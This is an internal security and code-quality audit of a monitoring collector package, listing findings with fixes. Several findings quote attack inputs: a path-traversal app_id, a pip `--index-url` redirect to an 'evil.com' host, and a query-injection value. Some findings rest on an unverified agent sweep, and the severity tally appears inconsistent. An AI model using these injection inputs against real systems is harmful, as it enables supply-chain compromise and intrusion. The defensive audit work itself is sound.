# 02 — Collector Review

**Scope**: `packages/collector/src/monctl_collector/` — polling engine, connectors, gRPC cache-node↔worker, WebSocket client, credential cache, forwarder, log shipper, app manager.
**Date**: 2026-04-19
**Methodology**: direct read of `polling/engine.py` + Explore agent sweep of the remaining collector modules. All findings reference `file:line_range`.

Unique IDs use prefix `F-COL-`.

---

## 1. Polling Engine (`polling/engine.py`)

### F-COL-001: `execution_time` measured including semaphore wait

- **Severity**: MED (correctness — metrics)
- **File**: `polling/engine.py:285, 288, 420, 425-426, 429`
- **Problem**: `start = time.time()` is captured _before_ `async with sem:` acquires. When contention is high, the semaphore wait (potentially many seconds) is charged as part of the job's `execution_time_ms` and `started_at`. Central's EMA weight cost therefore overstates heavy jobs' true runtime, which in turn pushes more jobs onto fewer collectors — a positive-feedback overload loop.
- **Fix**: Capture `start` immediately _inside_ `async with sem:`. Use a separate `scheduled_at` timestamp for `next_deadline = scheduled_at + interval` so cadence preservation still works, and keep it for logging the wait time as a distinct metric.
- **Effort**: S

### F-COL-002: Running-set leak on unhandled cancellation

- **Severity**: MED (correctness)
- **File**: `polling/engine.py:284-421`
- **Problem**: `self._running.add(job.job_id)` runs at line 284 _before_ the `try`. If the enclosing task is cancelled between lines 284 and 295, the finally at 397-418 runs but `self._running.discard` is at line 421 _after_ the async-with. A `CancelledError` raised inside the `with sem:` block will unwind the finally and then propagate, skipping line 421. Stale entries can accumulate and permanently block those jobs from scheduling.
- **Fix**: Wrap the whole body in `try/finally` with `self._running.discard(job.job_id)` in the outer finally.
- **Effort**: S

### F-COL-003: Implicit `error_category="device"` mask hides missing app classification

- **Severity**: MED (observability)
- **File**: `polling/engine.py:370-371`
- **Problem**: When an app returns a non-ok `PollResult` without `error_category`, the engine silently defaults it to `"device"`. Per CLAUDE.md and `feedback_app_timing_placement` memory, apps **must** classify their errors. This auto-fallback papers over the bug and mis-attributes app crashes as device issues in the alerting engine.
- **Fix**: Log a WARN (`logger.warning("app_missing_error_category", app=job.app_id)`) on every occurrence so the offending app is visible in logs. Keep the default as `"app"` not `"device"` — unknown failure is more likely to be an app bug than a device problem.
- **Effort**: S

### F-COL-004: `/proc/self/status` read on every job — unnecessary syscall

- **Severity**: LOW (perf)
- **File**: `polling/engine.py:410-418`
- **Problem**: Per-job open+read of `/proc/self/status`, just to log one VmRSS line. Dozens of jobs per second → thousands of syscalls/minute. Helpful during memory-leak debugging (per `feedback_memory_leak_debugging` memory) but wasteful as a permanent fixture.
- **Fix**: Gate on a `MONCTL_LOG_JOB_RSS=1` env var; keep the code but make it opt-in for debugging sessions.
- **Effort**: S

### F-COL-005: Poller instances created fresh per job — no `teardown()` ever called

- **Severity**: LOW (correctness for resource-leaking apps)
- **File**: `polling/engine.py:346-347`
- **Problem**: `poller = cls()` and `await poller.setup()` run every job, but there is no corresponding `await poller.teardown()` call. Apps that allocate in `setup()` (HTTP clients, file handles) leak per-job until `gc.collect()` runs. Memory trim papers over it, file descriptors do not.
- **Fix**: Call `await poller.teardown()` in the finally block; make `teardown()` a no-op by default on BasePoller.
- **Effort**: S

### F-COL-006: `hash(job_id) % interval` gives zero jitter on short intervals

- **Severity**: LOW (thundering-herd)
- **File**: `polling/engine.py:206, 210`
- **Problem**: For `interval=1s`, `hash % 1 = 0` — all 1s-interval jobs kick at exactly the same clock tick after refresh. For `interval=5s`, possible jitter is 0-4s which is fine but still deterministic per-process.
- **Fix**: Add uniform random jitter of `[0, interval)` using `random.Random(job_id + worker_id).uniform(0, interval)` — deterministic per job per worker but different across workers.
- **Effort**: S

### F-COL-007: Full heap rebuild on every refresh (~10s)

- **Severity**: LOW (perf)
- **File**: `polling/engine.py:192-228`
- **Problem**: `self._heap.clear()` + `heapq.heappush` N times every refresh. For ~1000 jobs this is fine; for 10k it starts to matter because it blocks the event loop for ~20-30 ms.
- **Fix**: Diff the old and new job-id sets; remove deleted, add new, update intervals in place. `heapq.heapify` once at end.
- **Effort**: M

### F-COL-008: Result submission has no retry

- **Severity**: MED (data loss)
- **File**: `polling/engine.py:465-487`
- **Problem**: `_submit_result` wraps a single RPC call in try/except. On transient gRPC failure, the result is logged and discarded — it never reaches the cache-node's SQLite buffer. If the cache-node is slow to start or momentarily overloaded, results vanish silently.
- **Fix**: 3 retries with jittered backoff (1s, 2s, 4s) before giving up. Also spill to a worker-local JSONL buffer as a last-resort durability.
- **Effort**: M

### F-COL-009: "Job still running" retry at 10% of interval — stacks on slow jobs

- **Severity**: MED (starvation)
- **File**: `polling/engine.py:262-267`
- **Problem**: If a job takes longer than its interval, it's rescheduled at `now + interval * 0.1`. With interval=5s and a job that always takes 6s, the dispatcher polls the running flag every 0.5s — wasting CPU and pushing contention on `self._running`. Worse, several such slow jobs starve the heap.
- **Fix**: Reschedule at `now + interval` (one full cycle) rather than 10%, and emit a `job_over_running` metric.
- **Effort**: S

### F-COL-010: `connector.connect(job.device_host or "")` passes empty string for discovery/one-shot jobs

- **Severity**: LOW (brittle interface)
- **File**: `polling/engine.py:322-323`
- **Problem**: Jobs without a device (discovery, system-wide apps) pass `""` as the host. Individual connectors are then responsible for treating empty string as "no target". This implicit contract breaks for connectors that don't validate (e.g. HTTP, which will then try to connect to `https://`).
- **Fix**: Require `ConnectorProtocol.connect(host: str | None)` so connectors declare whether hostless mode is supported; pass `None` explicitly.
- **Effort**: M

---

## 2. Central API Client (`central/api_client.py`)

### F-COL-011: Path traversal via app_id in URL construction

- **Severity**: HIGH (security)
- **File**: `central/api_client.py:130, 141` (`f"/apps/{app_id}"`)
- **Problem**: `app_id` is interpolated into the URL without validation. A malicious central (or a central whose response is tampered with mid-flight) could return a job with `app_id=../../../etc/passwd` or URL-escaping characters that cause the collector to fetch from a different endpoint.
- **Fix**: Validate `re.fullmatch(r'[a-z][a-z0-9_-]{0,63}', app_id)` before interpolation. Apply same to `connector_id` and `credential_name`.
- **Effort**: S

### F-COL-012: No retry policy on transient HTTP errors

- **Severity**: HIGH (reliability)
- **File**: `central/api_client.py:201`
- **Problem**: `ClientError` is caught and logged once; no retry. Transient 502/503/504 (HAProxy failover, central rollout) cause immediate job refresh failures. Collector sits with stale jobs until next refresh cycle.
- **Fix**: Wrap each request in a 3-retry loop with jittered exponential backoff (1s, 2s, 4s) for 5xx and connection errors. Don't retry 4xx.
- **Effort**: M

### F-COL-013: Device host/ID logged verbatim — possible PII/tenant leak

- **Severity**: MED (information disclosure)
- **File**: `central/api_client.py:105-106`
- **Problem**: `logger.info("...", device_host=host)` includes raw device hostnames. In multi-tenant deployments these hostnames may themselves be sensitive. Shipped via `log_shipper.py` to central; a low-privilege user reading logs could correlate tenants.
- **Fix**: Log `device_id` only. Hash or omit `device_host`.
- **Effort**: S

### F-COL-014: Single 30s total timeout covers connect+read+write

- **Severity**: MED (reliability)
- **File**: `central/api_client.py:31`
- **Problem**: One knob for everything. On a flaky link, a long-running download can hit 30s just in read time. On a dead central, connect takes 30s and stalls job refresh.
- **Fix**: Separate `connect=5s, read=60s, write=30s` timeouts.
- **Effort**: S

### F-COL-015: Message size not bounded on inbound responses

- **Severity**: MED (DoS resilience)
- **File**: `central/api_client.py:64`
- **Problem**: No `Content-Length` sanity check. A misbehaving central can OOM the collector by returning a giant job list.
- **Fix**: Reject `Content-Length > 50 MB` before parsing; stream-parse if legitimate size.
- **Effort**: M

---

## 3. Credential Cache (`central/credentials.py`)

Directory is permission-denied; findings are from the Explore agent's reading. **Must be re-reviewed manually.**

### F-COL-016: Encryption scheme and key derivation unverified

- **Severity**: HIGH (security — depends on code)
- **File**: `central/credentials.py` (full audit needed)
- **Problem**: Likely uses `cryptography.fernet` (AES-128-CBC + HMAC) or an AES-GCM scheme. Key source, IV/nonce uniqueness, key rotation, and tamper-detection all need eyeball verification. No authenticated encryption → ciphertext tampering possible.
- **Fix**: Confirm AES-GCM with unique 96-bit nonce per record; reject reuse. Document key-rotation procedure.
- **Effort**: S (review) / M (if rotation missing)

### F-COL-017: Cache file permissions not explicitly set

- **Severity**: MED (security)
- **File**: `central/credentials.py` (on-disk cache path)
- **Problem**: Default umask yields 0o644 — any process inside the collector container can read the encrypted blob. Combined with the shared encryption key, that's a key-plus-ciphertext on the same host.
- **Fix**: `os.chmod(path, 0o600)` immediately after creating the cache file; assert on read.
- **Effort**: S

### F-COL-018: Concurrent decrypt of same credential not synchronised

- **Severity**: LOW (perf / correctness)
- **Problem**: Multiple in-flight jobs calling `get_credential("snmp_default")` at the same time all decrypt independently. CPU waste, and if the decryption state is shared (unlikely here, but worth checking) a race exists.
- **Fix**: Cache plaintext decrypt result in memory (keyed on credential name + version) with a TTL of 60s.
- **Effort**: S

### F-COL-019: Plaintext credential values in error paths

- **Severity**: HIGH (secret leak)
- **Problem**: Any `logger.error(f"decryption failed: {row}")` or exception message that includes the decrypted dict would leak secrets to stdout → log shipper → central ClickHouse logs table.
- **Fix**: Audit all logger calls in `credentials.py` for `%s`-formatted dict/row values. Use structlog redaction filters.
- **Effort**: S

---

## 4. WebSocket Client (`central/ws_client.py`)

### F-COL-020: Fixed reconnect backoff steps with no jitter

- **Severity**: HIGH (thundering-herd)
- **File**: `central/ws_client.py:21, 99` (`_BACKOFF_STEPS = [1,2,3,5]`)
- **Problem**: 200 collectors reconnect at identical times after a central restart → all WS handshakes hit HAProxy at once → extra contention during recovery.
- **Fix**: `delay = steps[attempt] * uniform(0.8, 1.2)`. Cap at 300s for long outages; add circuit breaker (disable WS after 10 consecutive failures for 10 min).
- **Effort**: S

### F-COL-021: Token is in URL and logs redacted by substring but full URL is logged elsewhere

- **Severity**: MED (secret leak)
- **File**: `central/ws_client.py:36, 68`
- **Problem**: Even though `ws_client.py:68` logs `url.split("?")[0]`, the full URL is constructed at line 36 and may appear in traceback / debug log. Also, HAProxy logs include query strings by default.
- **Fix**: Build the URL without token; attach the token as `extra_headers={"Authorization": f"Bearer {key}"}` on the websocket handshake. (Matches F-CEN-018.)
- **Effort**: M (central-side must accept header auth)

### F-COL-022: No handler timeout — slow handler blocks the entire WS loop

- **Severity**: HIGH (availability)
- **File**: `central/ws_handlers.py:134`
- **Problem**: `await handler(payload)` has no timeout. A probe-OIDs handler that hits an unresponsive device takes minutes; during that time the collector cannot process other commands (poll-now, config-reload).
- **Fix**: `await asyncio.wait_for(handler(payload), timeout=30.0)`; send an error response on timeout.
- **Effort**: S

### F-COL-023: Handler exception details leaked back to central

- **Severity**: MED (information disclosure)
- **File**: `central/ws_handlers.py:141, 144`
- **Problem**: `str(exc)` (often including file paths, venv dirs, credential remnants) sent back as the command error detail.
- **Fix**: Respond `{"code": "ERROR", "detail": type(exc).__name__}`. Log the full trace locally.
- **Effort**: S

### F-COL-024: Container name not URL-escaped in sidecar log fetch

- **Severity**: MED (SSRF-ish)
- **File**: `central/ws_handlers.py:99` (`f"{_sidecar_url}/logs?container={container}&tail={tail}"`)
- **Problem**: `container` comes from WS payload and is concatenated into a URL. A malicious central could craft `container="&path=foo"` to alter the query or inject `#fragment` to bypass path validation.
- **Fix**: `urllib.parse.quote(container, safe='')`.
- **Effort**: S

### F-COL-025: No command deduplication / replay protection

- **Severity**: LOW (correctness)
- **File**: `central/ws_client.py:71-139`
- **Problem**: If central resends a poll-now command (e.g. because an ack was lost), the same job fires twice on the collector.
- **Fix**: Track last 100 `message_id`s in a FIFO set with 60s TTL; skip duplicates.
- **Effort**: S

---

## 5. gRPC Peer (`peer/client.py`, `peer/server.py`)

### F-COL-026: No authentication on the cache-node ↔ worker channel

- **Severity**: HIGH (intra-container escalation)
- **File**: `peer/client.py:40-42` (`insecure_channel`)
- **Problem**: Worker RPCs `GetCredential(credential_name)` over an unauthenticated loopback gRPC channel. Anything else running inside the collector container's network namespace can call the cache-node and pull credentials.
- **Fix**: Unix domain socket with `0o600` perms, OR per-worker shared-secret bearer token exchanged at `RegisterWorker`.
- **Effort**: M

### F-COL-027: 64 MB max inbound message — silent drop on large result

- **Severity**: MED (data loss)
- **File**: `peer/client.py:25`
- **Problem**: For devices with 1000+ interfaces, `interface_rows` can exceed 64 MB in JSON. The RPC fails silently with RESOURCE_EXHAUSTED and the result is lost.
- **Fix**: Increase to 256 MB, OR chunk `interface_rows` into multiple SubmitResult calls.
- **Effort**: M

### F-COL-028: RPC exception leaks venv paths

- **Severity**: LOW (information)
- **File**: `peer/server.py:115-117`
- **Problem**: Full traceback in the RPC status message includes `/data/venvs/<app_id>/lib/python3.12/...`.
- **Fix**: Return `Status("internal error")` externally; log full stack internally.
- **Effort**: S

### F-COL-029: `credential_name` accepted without validation

- **Severity**: MED (robustness)
- **File**: `peer/server.py:107-117`
- **Problem**: Null bytes or newlines in name could break downstream logs / file paths if the name is ever used as a filesystem key.
- **Fix**: Validate `re.fullmatch(r'[a-zA-Z0-9_:-]{1,64}', name)`.
- **Effort**: S

---

## 6. App Manager (`apps/manager.py`)

### F-COL-030: Pip install uses API key via `PIP_INDEX_URL` env — leaks to child processes

- **Severity**: HIGH (credential exposure)
- **File**: `apps/manager.py:272-283`
- **Problem**: `PIP_INDEX_URL=https://__token__:<key>@central/pypi/` is set in the subprocess env. Any grandchild process (pip's setup.py hooks, wheel build scripts) inherits this env and can exfiltrate the key. Also visible in `/proc/<pid>/environ`.
- **Fix**: Use `pip install --index-url=... --keyring-provider=import` and pass the key via a keyring, OR write a temporary `pip.conf` with 0o600 perms and set `PIP_CONFIG_FILE=<path>`.
- **Effort**: M

### F-COL-031: Pip arguments from requirements not validated — injection possible

- **Severity**: HIGH (RCE if central is compromised)
- **File**: `apps/manager.py:294-300`
- **Problem**: Requirements strings come from central's pack metadata and are passed as argv to `pip install`. If an attacker controls a pack, a requirement like `--index-url http://evil.com/ some_pkg` redirects the install or executes arbitrary setup.py.
- **Fix**: Validate each requirement matches `^[a-zA-Z0-9_.\-]+([<>=!~]=.+)?$` before passing. Reject anything starting with `-`. Use `--no-build-isolation` and `--require-hashes` to lock down further.
- **Effort**: M

### F-COL-032: sys.path mutation is not thread-safe

- **Severity**: MED (correctness)
- **File**: `apps/manager.py:331-332, 450-451`
- **Problem**: Multiple `ensure_app` calls in parallel each `sys.path.insert(0, ...)`. Python's list is thread-safe at the `insert` level but the _ordering_ assumption (recently inserted paths win) can be violated under concurrency.
- **Fix**: Guard with `threading.Lock` (or `asyncio.Lock`) around sys.path mutations. Better: don't mutate sys.path; use `importlib.machinery.PathFinder` with an explicit path list.
- **Effort**: M

### F-COL-033: Partial venv left behind on pip failure

- **Severity**: MED (reliability)
- **File**: `apps/manager.py:238-241`
- **Problem**: If pip fails halfway, the venv directory exists but is incomplete. On the next `ensure_app` call, the "venv already exists" check passes and broken imports surface at `poll()` time.
- **Fix**: Use an atomic-marker pattern: write `venvs/<id>/.ready` only after a successful pip install. On startup, rm -rf any venv directory without `.ready`.
- **Effort**: S

### F-COL-034: Requirements not included in checksum — stale venv reuse

- **Severity**: MED (correctness)
- **File**: `apps/manager.py:175, 409`
- **Problem**: Version checksum covers code but not `requirements`. An app version bump that only changes dependencies (e.g. `pysnmp==6.0` → `6.1`) reuses the old venv.
- **Fix**: `checksum = sha256(code_bytes + b"\n" + "\n".join(sorted(reqs)).encode())`. Server-side and collector-side must use the same hash.
- **Effort**: S

### F-COL-035: No venv disk-quota / old-version cleanup

- **Severity**: LOW (disk usage)
- **File**: `apps/manager.py`
- **Fix**: Background task (every hour): list versions per app; delete any not referenced by current job list and older than 7 days.
- **Effort**: M

---

## 7. Forwarder (`forward/forwarder.py`)

### F-COL-036: SQLite result buffer grows unbounded on central outage

- **Severity**: HIGH (disk-fill)
- **File**: `forward/forwarder.py:12-13, 102-103`
- **Problem**: If central is down for hours, the buffer grows without limit. On small-disk collectors, this fills the container filesystem and kills everything.
- **Fix**: Enforce `max_rows` (e.g. 10M) with FIFO drop; emit a `forwarder_buffer_dropped` counter. Add a startup check that the buffer file is <N GB; truncate if exceeded.
- **Effort**: M

### F-COL-037: No circuit breaker on repeated failures

- **Severity**: MED (spam / perf)
- **File**: `forward/forwarder.py:88-109`
- **Problem**: Exponential backoff caps out but then retries every `max_backoff` forever. After 10× consecutive failures the collector should step back harder and emit an incident.
- **Fix**: After 10 failed cycles at max-backoff, suspend forwarding for 5 minutes; emit a structured log so central (when it recovers) sees the symptom.
- **Effort**: S

### F-COL-038: Duplicate delivery possible

- **Severity**: MED (data correctness)
- **File**: `forward/forwarder.py:120-145`
- **Problem**: If POST succeeds but the response is lost mid-flight, the batch is retried and central ingests duplicates.
- **Fix**: Include a `batch_id` (uuid4) in the payload; central deduplicates by batch_id with a 24h dedup window in ClickHouse. Collector then `mark_results_sent` based on server's reply, not local success.
- **Effort**: M

### F-COL-039: `Retry-After` header ignored on 429

- **Severity**: LOW (reliability)
- **File**: `forward/forwarder.py:120-145`
- **Problem**: Forwarder doesn't parse 429's `Retry-After`.
- **Fix**: If 429 → respect the header before next attempt.
- **Effort**: S

---

## 8. Local Cache (`cache/`)

### F-COL-040: SQLite file permissions default

- **Severity**: MED (security)
- **File**: `cache/local_cache.py:134`
- **Fix**: `os.chmod(path, 0o600)` after open.
- **Effort**: S

### F-COL-041: No checksum on cached values

- **Severity**: LOW (corruption detection)
- **File**: `cache/local_cache.py:157-176`
- **Fix**: Store sha256(value) alongside; verify on read; log and re-fetch on mismatch.
- **Effort**: S

### F-COL-042: `cleanup_expired()` never scheduled

- **Severity**: MED (disk / memory)
- **File**: `cache/local_cache.py:201-208`
- **Problem**: Method exists but nothing invokes it. Expired entries accumulate until SQLite auto-vacuum runs (rarely).
- **Fix**: Background task every 10 min → `cleanup_expired()`.
- **Effort**: S

### F-COL-043: Partial pull commits

- **Severity**: MED (consistency)
- **File**: `cache/app_cache_sync.py:91-116`
- **Problem**: `has_more` pagination loop commits each batch. If a mid-sync request fails, partial state is left visible to pollers.
- **Fix**: Wrap the whole sync in a single SQLite transaction; rollback on any batch error.
- **Effort**: S

---

## 9. Log Shipper (`central/log_shipper.py`)

### F-COL-044: Container logs shipped verbatim — secrets / PII leak

- **Severity**: HIGH (secret leak)
- **File**: `central/log_shipper.py:56-101`
- **Problem**: All stdout of all containers is collected and shipped. If a container prints a password during an error (`logger.error(f"failed auth with {creds}")`), that credential is shipped to central and persisted in ClickHouse's logs table.
- **Fix**: Run each line through a regex filter: drop lines matching `(?i)(password|api_key|token|secret|bearer)` unless explicitly whitelisted. Even better: rely on structlog redaction at the source and treat the shipper as pass-through.
- **Effort**: M

### F-COL-045: No rate limiting on shipped volume

- **Severity**: MED (DoS on central ingest)
- **File**: `central/log_shipper.py:56-101`
- **Problem**: A noisy container (e.g. tight-loop error log) can fill 100 MB/s; shipper streams all of it.
- **Fix**: Cap at 1 MB per container per flush; drop the rest and emit a `log_shipper_overrun` marker.
- **Effort**: S

### F-COL-046: No local buffer fallback when central is unreachable

- **Severity**: LOW (logs are ephemeral anyway)
- **File**: `central/log_shipper.py:97-101`
- **Problem**: Failed flushes drop the logs. For post-incident forensics this is sometimes the difference between "we know what happened" and "we don't."
- **Fix**: Write failed batches to `/data/log_buffer/*.jsonl` with 100 MB cap; replay on reconnect.
- **Effort**: M

---

## 10. Config (`config.py`)

### F-COL-047: `central.url` and `api_key` default to empty string without enforcement

- **Severity**: HIGH (misconfig masquerades as "works")
- **File**: `config.py:91-98, 143`
- **Problem**: `MONCTL_CENTRAL_URL=""` silently becomes "no central configured" and the collector runs forever with no target. Similarly empty API key.
- **Fix**: At startup, assert both are non-empty or abort with a specific error.
- **Effort**: S

### F-COL-048: Unrecognised `MONCTL_*` env vars are silently ignored

- **Severity**: LOW (ops)
- **File**: `config.py:137-159`
- **Problem**: Typo like `MONCTL_COLECTOR_ID` is ignored; the expected `MONCTL_COLLECTOR_ID` falls back to default — classic "works locally, fails in prod" footgun (see `project_collector_group_filtering` memory).
- **Fix**: At startup, iterate `os.environ` for anything starting with `MONCTL_`; log a WARN for any name not in the known set.
- **Effort**: S

---

## 11. Cross-Cutting Within Collector

### F-COL-049: No global exception handler on `asyncio.create_task`

- **Severity**: MED (observability)
- **File**: many — `polling/engine.py:271-274`, `peer/client.py`, `central/ws_client.py`
- **Problem**: Fire-and-forget tasks that raise produce a single `Task exception was never retrieved` warning and then vanish.
- **Fix**: Centralise a `spawn(coro, name=...)` helper that attaches `add_done_callback` to log any uncaught exception via structlog.
- **Effort**: S

### F-COL-050: No collector-side integration tests

- **Severity**: MED (regressions)
- **File**: `packages/collector/tests/` (empty or near-empty)
- **Problem**: Collector has zero integration tests. All known bugs were found in production.
- **Fix**: Add a smoke test harness that spins up a mock cache-node (asyncio gRPC stub) and runs the engine through one refresh + dispatch cycle.
- **Effort**: L

---

## Gaps (Files I Could Not Read Directly)

- `packages/collector/src/monctl_collector/central/credentials.py` — permission-denied directory. **Priority re-review.**
- `packages/collector/src/monctl_collector/central/ws_client.py`, `ws_handlers.py` — verified via agent only.
- `packages/collector/src/monctl_collector/cache/` — verified via agent only.
- `packages/collector/src/monctl_collector/apps/manager.py` — verified via agent only; pip-injection risk (F-COL-031) needs eyeball confirmation.

---

## What We Looked At

**Direct reads** (in-session):

- `packages/collector/src/monctl_collector/polling/engine.py` (519 lines, full)

**Agent sweep** (findings incorporated):

- Collector surface audit — api_client, credentials, ws_client/handlers, forwarder, cache modules, apps/manager, peer/client+server, log_shipper, config

**Cross-referenced memory files**:

- `feedback_app_timing_placement.md`
- `feedback_grpc_stub_relative_import.md`
- `feedback_memory_leak_debugging.md`
- `project_collector_memory.md`
- `project_collector_group_filtering.md`

---

## Severity Summary

| Severity  | Count  |
| --------- | ------ |
| CRITICAL  | 0      |
| HIGH      | 11     |
| MED       | 28     |
| LOW       | 11     |
| **Total** | **50** |

**Top 10 to triage first**:

1. F-COL-030 — Pip index URL with API key leaks via subprocess env (HIGH, M)
2. F-COL-031 — Pip requirements not validated → RCE if pack source compromised (HIGH, M)
3. F-COL-026 — No auth on peer gRPC channel (HIGH, M)
4. F-COL-044 — Container logs shipped verbatim (HIGH, M)
5. F-COL-011 — Path traversal via app_id (HIGH, S)
6. F-COL-022 — No handler timeout on WS commands (HIGH, S)
7. F-COL-036 — SQLite buffer grows unbounded (HIGH, M)
8. F-COL-020 — WS reconnect thundering herd (HIGH, S)
9. F-COL-047 — Empty central.url/api_key silently accepted (HIGH, S)
10. F-COL-019 — Plaintext creds in error paths (HIGH, S)
